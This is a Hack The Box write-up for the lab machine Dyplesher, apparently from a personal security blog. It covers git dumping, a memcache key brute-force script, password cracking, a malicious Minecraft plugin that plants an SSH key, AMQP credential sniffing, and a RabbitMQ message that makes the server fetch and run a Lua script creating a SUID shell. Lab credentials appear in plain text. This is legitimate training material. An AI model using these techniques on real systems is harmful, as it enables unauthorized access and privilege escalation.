---
layout: single
title: Dyplesher - Hack The Box
excerpt: "Dyplesher was a pretty tough box that took me more than 10 hours to get to the user flag. There's quite a bit of enumeration required to get to the git repo and then find memcached credentials from the source code. I couldn't use the memcache module from Metasploit here since it doesn't support credentials so I wrote my own memcache enumeration script. We then make our way to more creds in Gogs, then craft a malicious Minecraft plugin to get RCE. To get to the first flag we'll sniff AMQP creds from the loopback interface. To priv esc, we send messages on the RabbitMQ bug and get the server to download and execute a lua script (Cubberite plugin)."
date: 2020-10-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-dyplesher/dyplesher_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - vhosts
  - gogs
  - memcache
  - sqlite
  - minecraft
  - capabilities
  - pcap
  - amqp
  - rabbitmq
  - lua
---

![](/assets/images/htb-writeup-dyplesher/dyplesher_logo.png)

Dyplesher was a pretty tough box that took me more than 10 hours to get to the user flag. There's quite a bit of enumeration required to get to the git repo and then find memcached credentials from the source code. I couldn't use the memcache module from Metasploit here since it doesn't support credentials so I wrote my own memcache enumeration script. We then make our way to more creds in Gogs, then craft a malicious Minecraft plugin to get RCE. To get to the first flag we'll sniff AMQP creds from the loopback interface. To priv esc, we send messages on the RabbitMQ bug and get the server to download and execute a lua script (Cubberite plugin).

## Portscan

```
snowscan@kali:~/htb/dyplesher$ sudo nmap -sT -p- 10.10.10.190
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-23 20:59 EDT
Nmap scan report for dyplesher.htb (10.10.10.190)
Host is up (0.019s latency).
Not shown: 65525 filtered ports
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
3000/tcp  open   ppp
4369/tcp  open   epmd
5672/tcp  open   amqp
11211/tcp open   memcache
25562/tcp open   unknown
25565/tcp open   minecraft
25672/tcp open   unknown
```

## Website

On the website we have a couple of non-functional links like **Forums** and **Store**. The **Staff** link goes to another static page with a list of staff users.

![](/assets/images/htb-writeup-dyplesher/image-20200524104320814.png)

![](/assets/images/htb-writeup-dyplesher/image-20200524104356684.png)

Dirbusting shows a few interesting links: **login**, **register** and **home**:

```
snowscan@kali:~/htb/dyplesher$ ffuf -w $WLRD -t 50 -u http://dyplesher.htb/FUZZ
________________________________________________

css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
login                   [Status: 200, Size: 4188, Words: 1222, Lines: 84]
register                [Status: 302, Size: 350, Words: 60, Lines: 12]
img                     [Status: 301, Size: 312, Words: 20, Lines: 10]
home                    [Status: 302, Size: 350, Words: 60, Lines: 12]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]
staff                   [Status: 200, Size: 4389, Words: 1534, Lines: 103]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
```

The login and register URL show a login page. We can try a few default creds but we're not able to get in.

![](/assets/images/htb-writeup-dyplesher/image-20200524105136663.png)

Gobusting the home directory shows a couple of other directories, all of which we can't reach because we are redirected to the login page.

```
snowscan@kali:~/htb/dyplesher$ ffuf -w $WLRW -t 50 -u http://dyplesher.htb/home/FUZZ
________________________________________________

add                     [Status: 302, Size: 350, Words: 60, Lines: 12]
.                       [Status: 301, Size: 312, Words: 20, Lines: 10]
delete                  [Status: 302, Size: 350, Words: 60, Lines: 12]
reset                   [Status: 302, Size: 350, Words: 60, Lines: 12]
console                 [Status: 302, Size: 350, Words: 60, Lines: 12]
players                 [Status: 302, Size: 350, Words: 60, Lines: 12]
```

## Gogs website

There's a Gogs instance running on port 3000. Gogs is a self-hosted Git service so there's a good chance we'll have to find the source code of an application on there.

![](/assets/images/htb-writeup-dyplesher/image-20200524105548752.png)

We can see the same list of 3 users we saw on the Staff page but there are no public repositories accessible from our unauthenticated user.

![](/assets/images/htb-writeup-dyplesher/image-20200524105743919.png)

When dirbusting the site we find a **debug** directory which contains the pprof profiler. I looked around and it didn't seem to be useful for anything.

```
snowscan@kali:~/htb/dyplesher$ ffuf -w $WLDC -t 50 -u http://dyplesher.htb:3000/FUZZ
________________________________________________

                        [Status: 200, Size: 7851, Words: 456, Lines: 252]
admin                   [Status: 302, Size: 34, Words: 2, Lines: 3]
assets                  [Status: 302, Size: 31, Words: 2, Lines: 3]
avatars                 [Status: 302, Size: 32, Words: 2, Lines: 3]
css                     [Status: 302, Size: 28, Words: 2, Lines: 3]
debug                   [Status: 200, Size: 160, Words: 18, Lines: 5]
explore                 [Status: 302, Size: 37, Words: 2, Lines: 3]
img                     [Status: 302, Size: 28, Words: 2, Lines: 3]
issues                  [Status: 302, Size: 34, Words: 2, Lines: 3]
js                      [Status: 302, Size: 27, Words: 2, Lines: 3]
plugins                 [Status: 302, Size: 32, Words: 2, Lines: 3]
```

## Vhost fuzzing

We haven't found much yet so we'll try fuzzing vhosts next and we find a **test.dyplesher.htb** vhost.

```
snowscan@kali:~/htb/dyplesher$ ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -H "Host: FUZZ.dyplesher.htb" -u http://dyplesher.htb -fr "Worst Minecraft Server"
________________________________________________

test                    [Status: 200, Size: 239, Words: 16, Lines: 15]
```

There's a memcache test interface running on the vhost where we can add key/values to the memcache instance running on port 11211. There doesn't seem to be any vulnerability that I can see on this page.

![](/assets/images/htb-writeup-dyplesher/image-20200524110832067.png)

When dirbusting we find a git repository, then we can use git-dumper to copy it to our local machine.

```
snowscan@kali:~/htb/dyplesher$ ffuf -w $WLDC -t 50 -u http://test.dyplesher.htb/FUZZ
________________________________________________

index.php               [Status: 200, Size: 239, Words: 16, Lines: 15]
                        [Status: 200, Size: 239, Words: 16, Lines: 15]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
.htpasswd               [Status: 403, Size: 283, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 283, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 283, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 283, Words: 20, Lines: 10]

snowscan@kali:~/htb/dyplesher/git$ ~/tools/git-dumper/git-dumper.py http://test.dyplesher.htb .
[-] Testing http://test.dyplesher.htb/.git/HEAD [200]
[-] Testing http://test.dyplesher.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://test.dyplesher.htb/.gitignore [404]
[-] Fetching http://test.dyplesher.htb/.git/description [200]
[-] Fetching http://test.dyplesher.htb/.git/COMMIT_EDITMSG [200]
[...]
```

Inside, we find the source code of the memcache test application, along with the memcache credentials: `felamos / zxcvbnm`

```php
<pre>
<?php
if($_GET['add'] != $_GET['val']){
	$m = new Memcached();
	$m->setOption(Memcached::OPT_BINARY_PROTOCOL, true);
	$m->setSaslAuthData("felamos", "zxcvbnm");
	$m->addServer('127.0.0.1', 11211);
	$m->add($_GET['add'], $_GET['val']);
	echo "Done!";
}
else {
	echo "its equal";
}
?>
</pre>
```

## Memcache enumeration

We don't have the list of memcache keys but we can write a script that will brute force them and return the values.

```python
#!/usr/bin/env python3

import bmemcached
from pprint import pprint

client = bmemcached.Client('10.10.10.190:11211', 'felamos', 'zxcvbnm')

with open("/usr/share/seclists/Discovery/Variables/secret-keywords.txt") as f:
    for x in [x.strip() for x in f.readlines()]:
        result = str(client.get(x))
        if 'None' not in result:
        	print(x + ": " + result)
```

The memcache instance contains some email addresses, usernames and password hashes that we will try to crack.

```
snowscan@kali:~/htb/dyplesher$ ./brute_keys.py 
email: MinatoTW@dyplesher.htb
felamos@dyplesher.htb
yuntao@dyplesher.htb

password: $2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS

username: MinatoTW
felamos
yuntao
```

We're able to crack the password for user felamos: `mommy1`

```
snowscan@kali:~/htb/dyplesher$ john -w=/usr/share/wordlists/rockyou.txt memcache-hashes.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mommy1           (?)

snowscan@kali:~/htb/dyplesher$ cat ~/.john/john.pot 
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK:mommy1
```

## Getting access to the Gogs repository

We're able to log into the Gogs instance with Felamos' credentials. There's two repositories available: **gitlab** and **memcached**.

![](/assets/images/htb-writeup-dyplesher/image-20200524112126061.png)

The memcached repo contains the same information we got earlier from the .git directory on the test.dyplesher.htb website. However the gitlab repo contains a zipped backup of the repositories.

![](/assets/images/htb-writeup-dyplesher/image-20200524112259332.png)

After unzipping the file, we get a bunch of directories with .bundle files. These are essentially a full repository in single file.

```
snowscan@kali:~/htb/dyplesher$ ls -laR repositories/
repositories/:
total 12
[...]
repositories/@hashed/4b/22:
total 24
drwxr-xr-x 3 snowscan snowscan  4096 Sep  7  2019 .
drwxr-xr-x 3 snowscan snowscan  4096 Sep  7  2019 ..
drwxr-xr-x 2 snowscan snowscan  4096 Sep  7  2019 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a
-rw-r--r-- 1 snowscan snowscan 10837 Sep  7  2019 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
```

We can use the git clone command to extract the repository files from those bundle files. There are 4 repositories inside the backup file:

- VoteListener
- MineCraft server
- PhpBash
- NightMiner

```
snowscan@kali:~/htb/dyplesher/git-backup$ ls -la
total 28
drwxr-xr-x 7 snowscan snowscan 4096 May 23 16:55 .
drwxr-xr-x 6 snowscan snowscan 4096 May 24 11:26 ..
drwxr-xr-x 4 snowscan snowscan 4096 May 23 15:44 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a
drwxr-xr-x 8 snowscan snowscan 4096 May 23 23:42 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
drwxr-xr-x 3 snowscan snowscan 4096 May 23 15:43 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
drwxr-xr-x 3 snowscan snowscan 4096 May 23 15:43 d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35
```

There's an SQLite database file inside the **LoginSecurity** directory:

```
snowscan@kali:~/htb/dyplesher/git-backup$ ls -l 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/
total 8
-rw-r--r-- 1 snowscan snowscan  396 May 24 00:44 config.yml
-rw-r--r-- 1 snowscan snowscan 3072 May 23 15:43 users.db
snowscan@kali:~/htb/dyplesher/git-backup$ file 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db 
4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db: SQLite 3.x database, last written using SQLite version 3007002
```

The file contains another set of hashed credentials:

```
$ sqlite3 ./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|/192.168.43.81
```

Here we go, got another password: `alexis1`

```
snowscan@kali:~/htb/dyplesher$ john -w=/usr/share/wordlists/rockyou.txt git-hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexis1          (?)
1g 0:00:00:06 DONE (2020-05-24 11:36) 0.1501g/s 243.2p/s 243.2c/s 243.2C/s alexis1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## RCE using Minecraft plugin

Now that we have more credentials, we can go back to the main webpage and log in. We have a dashboard with some player statistics and a menu to upload plugins.

![](/assets/images/htb-writeup-dyplesher/image-20200524113803504.png)

The console displays the messages from the server.

![](/assets/images/htb-writeup-dyplesher/image-20200524113905691.png)

Looks like we'll have to create a plugin to get access to the server. We can follow the following blog post instructions on how to create a plugin with Java: [https://bukkit.gamepedia.com/Plugin_Tutorial](https://bukkit.gamepedia.com/Plugin_Tutorial)

After trying a couple of different payloads I wasn't able to get anything to connect back to me so I assumed there was a firewall configured to block outbound connections. So instead I used the following to write my SSH keys to MinatoTW home directory:

```java
package pwn.snowscan.plugin;

import java.io.*;
import org.bukkit.*;
import org.bukkit.plugin.java.JavaPlugin;
import java.util.logging.Logger;

public class main extends JavaPlugin {

    @Override
    public void onEnable() {    	
    	Bukkit.getServer().getLogger().info("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");
    	try {
		    FileWriter myWriter = new FileWriter("/home/MinatoTW/.ssh/authorized_keys");
		    myWriter.write("ssh-rsa AAAAB3NzaC1yc2EAAA[...]JsSkunC1TzjHyY70NfMskJViGcs= snowscan@kali");
		    myWriter.close();
		    Bukkit.getServer().getLogger().info("Successfully wrote to the file.");
		} catch (IOException e) {
			Bukkit.getServer().getLogger().info("An error occurred.");
		    e.printStackTrace();
		}
    	Bukkit.getServer().getLogger().info("YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY");
    }
    
    @Override
    public void onDisable() {
    	
    }
}
```

After adding and reloading the script, our SSH public key is written to the home directory and we can log in.

![](/assets/images/htb-writeup-dyplesher/image-20200524114411007.png)

## Privesc to Felamos

Our user is part of the wireshark group so there's a good chance the next part involves traffic sniffing.

```
MinatoTW@dyplesher:~$ id
uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
```

As suspected, the dumpcat program has been configured to with elevated capabilities:

```
MinatoTW@dyplesher:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/dumpcap = cap_net_admin,cap_net_raw+eip
```

We'll capture packets on the loopback interface in order to capture some of traffic for the RabbitMQ instance.

```
MinatoTW@dyplesher:~$ dumpcap -i lo -w local.pcap
Capturing on 'Loopback: lo'
File: local.pcap
Packets: 90
```

The pcap file contains some AMQP messages with additional credentials:

- `felamos  / tieb0graQueg`
- `yuntao   / wagthAw4ob`
- `MinatoTW / bihys1amFov`

![](/assets/images/htb-writeup-dyplesher/image-20200524114757641.png)

![](/assets/images/htb-writeup-dyplesher/image-20200524114949910.png)

## Root privesc

The send.sh file contains a hint about what we need to do next:

```
felamos@dyplesher:~$ ls
cache  snap  user.txt  yuntao
felamos@dyplesher:~$ ls yuntao/
send.sh
felamos@dyplesher:~$ cat yuntao/send.sh 
#!/bin/bash

echo 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' >  /dev/pts/{}
```

Cubberite plugins are basically just lua scripts so we can created a simple script that'll copy and make bash suid, then host that script locally with a local webserver.

```lua
os.execute("cp /bin/bash /tmp/snow")
os.execute("chmod 4777 /tmp/snow")
```

We'll reconnect to the box and port forward port 5672 so we can use the Pika Python library and publish messages to the RabbitMQ messaging bus: `ssh -L 5672:127.0.0.1:5672 felamos@10.10.10.190`

```python
#!/usr/bin/python

import pika

credentials = pika.PlainCredentials('yuntao', 'EashAnicOc3Op')
parameters = pika.ConnectionParameters('127.0.0.1', 5672, credentials=credentials)
connection = pika.BlockingConnection(parameters)

channel = connection.channel()

channel.exchange_declare(exchange='plugin_data', durable=True)
channel.queue_declare(queue='plugin_data', durable=True)
channel.queue_bind(queue='plugin_data', exchange='plugin_data', routing_key=None, arguments=None)
channel.basic_publish(exchange='plugin_data', routing_key="plugin_data", body='http://127.0.0.1:8080/pwn.lua')
print("Message sent, check the webserver to see if the LUA script was fetched.")
connection.close()
```

```
snowscan@kali:~/htb/dyplesher$ python3 exploit.py 
Message sent, check the webserver to see if the LUA script was fetched.

felamos@dyplesher:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
127.0.0.1 - - [24/May/2020 15:57:29] "GET /pwn.lua HTTP/1.0" 200 -
```

After a few moments, the LUA script is executed and we have a SUID bash we can use to get root.

![](/assets/images/htb-writeup-dyplesher/image-20200524115627328.png)